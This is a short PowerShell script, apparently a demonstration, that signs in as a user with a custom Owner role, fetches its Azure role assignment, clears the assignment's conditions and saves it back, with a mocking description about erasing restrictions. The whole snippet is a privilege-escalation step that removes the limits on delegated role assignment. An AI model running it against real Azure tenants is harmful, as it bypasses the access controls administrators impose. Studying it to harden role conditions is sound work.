Connect-AzAccount # sign in with the user assigned with the custom Owner role

$roleAssignment = Get-azroleassignment -signInName "" # change this to the user with UAA or Owner role
$roleAssignment.Condition = ""
$roleAssignment.ConditionVersion = ""
$roleAssignment.Description = "With all the useless restrictions, I could simply snap my fingers. They would all cease to exist. I call that... MERCY."

Set-AzRoleAssignment -InputObject $roleAssignment -PassThru
